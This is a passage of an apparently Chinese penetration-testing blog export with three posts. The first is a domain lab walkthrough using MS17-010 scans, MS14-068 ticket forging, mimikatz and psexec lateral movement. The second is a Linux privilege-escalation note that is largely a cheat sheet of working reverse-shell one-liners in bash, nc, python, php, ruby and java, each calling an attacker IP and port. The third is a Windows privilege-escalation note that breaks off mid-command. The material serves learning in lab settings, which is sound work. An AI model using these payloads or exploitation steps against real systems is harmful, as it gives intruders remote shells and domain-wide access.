ip 存活并且都开放了 445 端口，可以扫一波 ms17-010</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635212902/Xnip2021-10-26_09-48-01_d69xve.png"></p><p>这里可以再用 nmap 扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn -n 192.168.183.129-130</span><br></pre></td></tr></table></figure><h3 id="MS17-010-利用"><a href="#MS17-010-利用" class="headerlink" title="MS17-010 利用"></a>MS17-010 利用</h3><p>开放了 445 端口，使用 msf 扫描一波 ms17-010</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.183.129-130</span><br><span class="line">rhosts =&gt; 192.168.183.129-130</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br></pre></td></tr></table></figure><p>两台主机都存在永恒之蓝</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635213356/Xnip2021-10-26_09-55-02_o8jn38.png"></p><p>打一波 ms17-010</p><p>tmd 失败了</p><p>ms17-010 看运气的，他靶场设计是 ms17-010 攻击拿下一台域内成员机权限再攻击域控，我试了好多次，攻击均失败。</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635215895/Xnip2021-10-26_10-38-00_go8nbs.png"></p><p>那我们假装 ms17-010 攻击成功了</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.zhimg.com%2F50%2Fv2-ca779f53efd482f2b23074d3ce38692f_hd.jpg&refer=http%3A%2F%2Fpic1.zhimg.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1637807854&t=064a566ed44672d87c9cc8be3c782e11"></p><h2 id="cs-上线"><a href="#cs-上线" class="headerlink" title="cs 上线"></a>cs 上线</h2><p>上号一起多人运动</p><p>创建一个神秘的监听</p><p>这台域内成员机不出网、emmm</p><p>让这台 win7 上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635226937/Xnip2021-10-26_13-41-45_t3gry3.png"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ms14-058 提权至 system</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635226822/Xnip2021-10-26_13-39-27_bonfml.png"></p><h3 id="抓取账户明文密码"><a href="#抓取账户明文密码" class="headerlink" title="抓取账户明文密码"></a>抓取账户明文密码</h3><p>抓到了一个普通域用户的明文密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635227063/Xnip2021-10-26_13-44-03_er7ykr.png"></p><p>dumphash</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635227084/Xnip2021-10-26_13-44-25_jdhx78.png"></p><p>补丁状况</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635227280/Xnip2021-10-26_13-46-53_ptfqyl.png"></p><h3 id="MS14-068-域普通用户提权域管"><a href="#MS14-068-域普通用户提权域管" class="headerlink" title="MS14-068 域普通用户提权域管"></a>MS14-068 域普通用户提权域管</h3><p>在线查询一下补丁，发现可以 MS14-068 提权</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635227418/Xnip2021-10-26_13-50-00_o3cir1.png"></p><p>ms14-068 可以将域普通用户提权至域管权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@demo.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br></pre></td></tr></table></figure><p>票据生成成功</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635228150/Xnip2021-10-26_13-57-55_vtuxcc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge  #清除系统已有票据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc c:\Windows\temp\TGT_douser@demo.com.ccache  #注入票据</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635228305/Xnip2021-10-26_14-04-51_fmtfoi.png"></p><h3 id="PSEXEC-横向"><a href="#PSEXEC-横向" class="headerlink" title="PSEXEC 横向"></a>PSEXEC 横向</h3><p>既然已经有域管票据，直接横向 DC 即可</p><p>因为 DC 不出网，所以需要利用跳板机转发上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635232976/Xnip2021-10-26_15-22-31_vj8xgu.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635235272/WechatIMG317_gzkbx7.png"></p><p>也可以写计划任务上线</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>靶场还需改进、体验不是太好!</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 提权小结</title>
      <link href="/posts/797525311/"/>
      <url>/posts/797525311/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="Linux-常用命令"><a href="#Linux-常用命令" class="headerlink" title="Linux 常用命令"></a>Linux 常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uname -a #查看内核/操作系统/cpu信息</span><br><span class="line">cat /etc/issue #查看操作系统版本</span><br><span class="line">cat /proc/version #查看系统信息</span><br><span class="line">hostname #查看主机名</span><br><span class="line">env #查看环境变量</span><br><span class="line">ifconfig #查看网卡信息</span><br><span class="line">netstat -lntp #查看所有监听端口</span><br><span class="line">netstat -antp #查看所有已建立的连接</span><br><span class="line">netstat -s #查看网络统计信息</span><br><span class="line">iptables -L #查看防火墙设置</span><br><span class="line">route #查看路由表信息</span><br><span class="line">ps -ef #查看所有进程信息</span><br><span class="line">top #实时显示进程状态</span><br><span class="line">w  #查看活动用户</span><br><span class="line">id #查看指定用户信息</span><br><span class="line">last  #查看用户登录日志</span><br><span class="line">cut -d: -f1 /etc/passwd #查看系统所有用户</span><br><span class="line">cut -d: -f1 /etc/group #查看系统所有组</span><br><span class="line">crontab -l #查看当前用户计划任务</span><br><span class="line">chkconfig –list # 列出所有系统服务 部分linux有此命令</span><br><span class="line">chkconfig –list | grep on # 列出所有启动的系统服务 部分linux有此命令</span><br><span class="line">echo $path #查看系统路径</span><br></pre></td></tr></table></figure><h2 id="反弹-shell-命令"><a href="#反弹-shell-命令" class="headerlink" title="反弹 shell 命令"></a>反弹 shell 命令</h2><p>攻击者使用 nc 或者其他工具开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999 #监听9999端口</span><br></pre></td></tr></table></figure><h3 id="bash-反弹-shell"><a href="#bash-反弹-shell" class="headerlink" title="bash 反弹 shell"></a>bash 反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip_address/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/9999 0&gt;&amp;1&quot;c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/10.10.10.10/9999 0&lt;&amp; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/10.10.10.10/9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec /bin/sh 010.10.10.10/9999 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.10.10/9999; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/udp/10.10.10.10/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>payload 在线生成：<a href="http://payloads.net/Reverse/">http://payloads.net/Reverse/</a></p><h3 id="nc-反弹-shell"><a href="#nc-反弹-shell" class="headerlink" title="nc 反弹 shell"></a>nc 反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.2.130 9999</span><br></pre></td></tr></table></figure><p>某些版本的 nc 没有 - e 参数 (非传统版), 则可使用以下方式解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 9999 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h3 id="python-反弹-shell"><a href="#python-反弹-shell" class="headerlink" title="python 反弹 shell"></a>python 反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os</span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(( &quot;10.10.10.10&quot; , 9999 ))</span><br><span class="line">os.dup2(s.fileno(), 0 )</span><br><span class="line">os.dup2(s.fileno(), 1 )</span><br><span class="line">os.dup2(s.fileno(), 2 )</span><br><span class="line">p = subprocess.call([ &quot;/bin/bash&quot; , &quot;-i&quot; ])</span><br></pre></td></tr></table></figure><h3 id="php-反弹-shell"><a href="#php-反弹-shell" class="headerlink" title="php 反弹 shell"></a>php 反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.10.10.10&quot;,9999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><h3 id="ruby-反弹-shell"><a href="#ruby-反弹-shell" class="headerlink" title="ruby 反弹 shell"></a>ruby 反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.10.10.10&quot;,9999).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure><h3 id="java-反弹-shell"><a href="#java-反弹-shell" class="headerlink" title="java 反弹 shell"></a>java 反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.10/9999;cat &lt;&amp;5 | while read</span><br><span class="line">line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h3 id="xterm-反弹-shell"><a href="#xterm-反弹-shell" class="headerlink" title="xterm 反弹 shell"></a>xterm 反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br></pre></td></tr></table></figure><h2 id="python-调用本地-shell-实现交互式命令行"><a href="#python-调用本地-shell-实现交互式命令行" class="headerlink" title="python 调用本地 shell 实现交互式命令行"></a>python 调用本地 shell 实现交互式命令行</h2><p>有些时候反弹的系统的命令终端不允许直接访问，可以使用 python 虚拟化一个终端来执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><h2 id="linux-反弹-shell-解决乱码"><a href="#linux-反弹-shell-解决乱码" class="headerlink" title="linux 反弹 shell 解决乱码"></a>linux 反弹 shell 解决乱码</h2><p>ctrl+z 放置后台任务，设置原始格式后，fg 再调用后台任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty -echo raw  #要改为bash再执行 zsh可能会报错</span><br></pre></td></tr></table></figure><h2 id="linux-提权"><a href="#linux-提权" class="headerlink" title="linux 提权"></a>linux 提权</h2><h3 id="linux-内核漏洞提权"><a href="#linux-内核漏洞提权" class="headerlink" title="linux 内核漏洞提权"></a>linux 内核漏洞提权</h3><p>通常我们在拥有一个 webshell 的时候，一般权限都是 WEB 容器权限，如在 iis 就是 iis 用户组权限，在 apache 就是 apache 权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip 信息等。如果我想进行内网渗透就必须将权限提权到最高，如 root 权限</p><h3 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h3><p>利用堆栈溢出漏洞，根据当前系统版本信息， 寻找对应的漏洞的 exp，使用 exp 对其进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>该漏洞是 Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在条件竞争漏洞， 导致可以破坏私有只读内存映射。黑客可以在获取低权限的的本地用户后，利用此漏洞获取 其他只读内存映射的写权限，进一步获取 root 权限。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 提权小结</title>
      <link href="/posts/2555275458/"/>
      <url>/posts/2555275458/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="windows-基础知识"><a href="#windows-基础知识" class="headerlink" title="windows 基础知识"></a>windows 基础知识</h2><h3 id="用户与组"><a href="#用户与组" class="headerlink" title="用户与组"></a>用户与组</h3><p>在 windows 中不用的用户有着不同的权限，权限主要包括有：完全控制、修改、读取和执行、列出文件夹<br>内容、读取、写入等，其中超级管理员和 system 用户权限级别最高。</p><h3 id="常见内置用户"><a href="#常见内置用户" class="headerlink" title="常见内置用户"></a>常见内置用户</h3><p>Administrator，系统默认管理员账号，拥有对系统的完全控制权，权限很高</p><p>Guest，来宾账号，提供访问共享资源的网络用户使用，仅具有基本权限，默认被禁用</p><p>system，系统内置安全主体账户，在 Windows 中拥有比管理员更大的权限，在 Windows 中主要作为系统服务或进程的运行账户</p><h3 id="内置用户组"><a href="#内置用户组" class="headerlink" title="内置用户组"></a>内置用户组</h3><p>1、Administrators，管理员组，此组中的用户权限较高</p><p>2、users 组，新建用户默认所属的组</p><p>3、guests 组，权限最低</p><p>4、iis_users 组 Internet 信息服务使用的内置组</p><p>一个用户可以属于多个用户组，常见的用户组是 管理组 (Administrators)、普通用户组（Users）、iis 用户组（IIS_IUSRS）、来宾组（Guests）、远程登录组（Remote Desktop Users）等</p><h3 id="windows-常用命令"><a href="#windows-常用命令" class="headerlink" title="windows 常用命令"></a>windows 常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user #查看本地用户</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username #查看用户详细信息 例如组信息等</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">whoami  /?</span><br><span class="line">whoami 有三种使用方法:</span><br><span class="line">语法 1:</span><br><span class="line">WHOAMI [/UPN | /FQDN | /LOGONID]</span><br><span class="line">语法 2:</span><br><span class="line">WHOAMI &#123; [/USER] [/GROUPS] [/CLAIMS] [/PRIV] &#125; [/FO format] [/NH]</span><br><span class="line">语法 3:</span><br><span class="line">WHOAMI /ALL [/FO format] [/NH]</span><br><span class="line">描述:</span><br><span class="line">这个工具可以用来获取本地系统上当前用户(访问令牌)的用户名和组信息，以及相应的安全标识符(SID)、声明、本地系统上当前用户的权限、登录标识符(登录 ID)。例如，谁是当前已登录的用户?</span><br><span class="line">格式(域\用户名)</span><br><span class="line"></span><br><span class="line">参数列表:</span><br><span class="line">/UPN 用用户主体 (User Principal) 格式显示用户名名称 (UPN)格式。</span><br><span class="line">/FQDN 用完全合格的 (Fully Qualified) 格式显示用户名可分辨名称(FQDN) 格式。</span><br><span class="line">/USER 显示当前用户的信息以及安全标识符 (SID)。</span><br><span class="line">/GROUPS 显示当前用户的组成员信息、帐户类型和安全标识符 (SID) 和属性。</span><br><span class="line">/CLAIMS 显示当前用户的声明，包括声明名称、标志、类型和值。</span><br><span class="line">/PRIV 显示当前用户的安全特权。</span><br><span class="line">/LOGONID 显示当前用户的登录 ID。</span><br><span class="line">/ALL 显示当前用户名、所属的组以及安全等级当前用户访问令牌的标识符(SID)、声明和权限。</span><br><span class="line">/FO format 指定要显示的输出格式。有效值为 TABLE、LIST、CSV。列标题未使用 CSV格式显示。默认格式为 TABLE。</span><br><span class="line">/NH 指定不应在输出中显示列标题。此参数仅对</span><br><span class="line">TABLE 和 CSV 格式有效。</span><br><span class="line">/? 显示此帮助消息。</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">WHOAMI</span><br><span class="line">WHOAMI /UPN</span><br><span class="line">WHOAMI /FQDN</span><br><span class="line">WHOAMI /LOGONID</span><br><span class="line">WHOAMI /USER</span><br><span class="line">WHOAMI /USER /FO LIST</span><br><span class="line">WHOAMI /USER /FO CSV</span><br><span class="line">WHOAMI /GROUPS</span><br><span class="line">WHOAMI /GROUPS /FO CSV /NH</span><br><span class="line">WHOAMI /CLAIMS</span><br><span class="line">WHOAMI /CLAIMS /FO LIST</span><br><span class="line">WHOAMI /PRIV</span><br><span class="line">WHOAMI /PRIV /FO TABLE</span><br><span class="line">WHOAMI /USER /GROUPS</span><br><span class="line">WHOAMI /USER /GROUPS /CLAIMS /PRIV</span><br><span class="line">WHOAMI /ALL</span><br><span class="line">WHOAMI /ALL /FO LIST</span><br><span class="line">WHOAMI /ALL /FO CSV /NH</span><br><span class="line">WHOAMI /?</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line">用户名 SID</span><br><span class="line">======================= ===========================================</span><br><span class="line">12server7\administrator S-1-5-21-3260979670-785508571-521063199-500</span><br><span class="line">组信息</span><br><span class="line">-----------------</span><br><span class="line">组名 类型 SID 属性</span><br><span class="line">==================================== ====== ============</span><br><span class="line">==========================================</span><br><span class="line">Everyone 已知组 S-1-1-0 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\本地帐户和管理员组成员 已知组 S-1-5-114 必需的组, 启用于默认, 启用的组</span><br><span class="line">BUILTIN\Administrators 别名 S-1-5-32-544 必需的组, 启用于默认, 启用的</span><br><span class="line">组, 组的所有者</span><br><span class="line">BUILTIN\Users 别名 S-1-5-32-545 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\INTERACTIVE 已知组 S-1-5-4 必需的组, 启用于默认, 启用的</span><br><span class="line">组 CO</span><br><span class="line">NSOLE LOGON 已知组 S-1-2-1 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\Authenticated Users 已知组 S-1-5-11 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\This Organization 已知组 S-1-5-15 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\本地帐户 已知组 S-1-5-113 必需的组, 启用于默认, 启用的组</span><br><span class="line">LOCAL 已知组 S-1-2-0 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\NTLM Authentication 已知组 S-1-5-64-10 必需的组, 启用于默认, 启用的</span><br><span class="line">组 Ma</span><br><span class="line">ndatory Label\High Mandatory Level 标签 S-1-16-12288</span><br><span class="line">特权信息</span><br><span class="line">----------------------</span><br><span class="line">特权名 描述 状态</span><br><span class="line">=============================== ========================== ======</span><br><span class="line">SeIncreaseQuotaPrivilege 为进程调整内存配额 已禁用</span><br><span class="line">SeSecurityPrivilege 管理审核和安全日志 已禁用</span><br><span class="line">SeTakeOwnershipPrivilege 取得文件或其他对象的所有权 已禁用</span><br><span class="line">SeLoadDriverPrivilege 加载和卸载设备驱动程序 已禁用2.windows的sid详解</span><br></pre></td></tr></table></figure><h3 id="windows-sid-简介"><a href="#windows-sid-简介" class="headerlink" title="windows sid 简介"></a>windows sid 简介</h3><p>Windows 安全性主要依赖于几个基本元素：访问令牌、SID、安全描述符、访问控制列表、密码、</p><p>访问令牌：访问令牌在本质上定义了两 上 “P”：Permissions（权限）和 Privilege（特权）。两者区别并不明显。访问令牌的内容和功能由用户的 SID、组的 SID、登录 SID、用户特权、默认所有者、SID、默认组 SID、默认 DACL、起源进程、令牌类型、模拟级别、受限 SID。</p><p>权限：一个用户进程在接触一个对象时，“安全性参考监视器” 将访问令牌中的 SID 与 “对象访问控制列表（ACL）” 中的 SID 匹配。可能出现的两种情 况：1. 如果没有匹配，就拒绝用户访问，这称为 “隐式拒绝（implici deny）”;2. 如果有一个区配，就将与 ACK 中的条目关联的权限授予给用户。这可能是 Allow, 也可能是一个 Deny 权限。在两个权限都直接指派给 对象的前提下，Deny 权限将优先于 Allow 权限 (在对待继承的权限时，采取的方式稍有不同)</p><p>SID：一个典型的 SID：S－1-5-21-1683771068-12213551888-624655398-1001 ，它遵循的模式是：S－R－IA－SA－SA－RID。</p><p>下面是具体解释：<br>1、字母 S 指明这是一个 SID 标识符，它将数字标记为一个 SID。<br>2、R 代表 Revision（修订），Windows 生成的所有 SID 都使用修订级别 1.<br>3、IA 代表颁发机构。在 Widnwos 中，几乎所有 SID 都指定 NT 机构作为颁发机构，它的 ID 编号为 5. 但是，代表已知组和账户的 SID 例外。<br>4、SA 代表一个子机构。SA 指定特殊的组或职能。例如、21 表明 SID 由一个域控制器或者一台单机颁发。随后的一长串数字（1683771068-12213551888-624655398）就是颁发 SID 的那个域或机器的 SA。<br>5、RID 是指相对 ID（RID）、是 SA 所指派的一个惟一的、顺序的编号、代表一个安全主体（比如一个用户、计算机或组）新的已知 SID：在经典 NT 和 windows2000 中，Local System 账户 SID S－1-5-18 为几乎所有服务提供了安全上下文，该账户具有很大的特权。Windows2003 则引入了另外两个 “已知 SID” 来为服务提供一个安全上下文、即 LocalService 和 NetworkService。部分已知 SID 及功能见 Microsoft KB243330<br>已知 RID：指派给用户、计算机和组的 RID 从 1000 开始。500-999 的 RID 被专门保留起来、表示在每个 Windows 计算机和域中通用的账户和 组，它们称为 “已知 RID” 有些已知 RID 会附加到一个域 SID 上，从而构成一个惟一的标识符。另一些则附加到 Builtin SID (S-1-5-32) 上，指出它们是可能具有特权的 Builtin 账户－－特权要么是硬编码到操作系统中的，要么是在安全数据库中指派的。</p><p>官方文档参考：<a href="https://docs.microsoft.com/zh-CN/windows/security/identity-protection/access-control/security-identifiers">https://docs.microsoft.com/zh-CN/windows/security/identity-protection/access-control/security-identifiers</a></p><h2 id="windows-权限提升"><a href="#windows-权限提升" class="headerlink" title="windows 权限提升"></a>windows 权限提升</h2><p>提权是指把普通用户的权限进行提升，也叫特权提升，在渗透测试中，通过是各种漏洞提升 webshell 权限以夺得服务器权限。<br>webshell 的权限根据不同的中间件权限也有所不同，如没经过特殊设置，webshell 的权限是继承该中间件的权限。</p><h3 id="提权常用方法"><a href="#提权常用方法" class="headerlink" title="提权常用方法"></a>提权常用方法</h3><p>windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权、ftp 提权等。</p><h3 id="提权常用命令"><a href="#提权常用命令" class="headerlink" title="提权常用命令"></a>提权常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr OS #获取系统版本信息</span><br><span class="line">systeminfo &amp;&amp; wmic product get name,version&amp;&amp;wmic nic where PhysicalAdapter=True get MACAddress,Name&amp;&amp;wmic NICCONFIG WHERE IPEnabled=true GET IPAddress #检测系统软件包</span><br><span class="line">hostname #获取主机名称</span><br><span class="line">whoami /all #获取当前用户的详细信息</span><br><span class="line">whoami /priv #显示当前用户的安全特权</span><br><span class="line">net start #查看服务</span><br><span class="line">netstat -ano | findstr 3389 #获取rdp连接来源IP</span><br><span class="line">dir c:\programdata\ 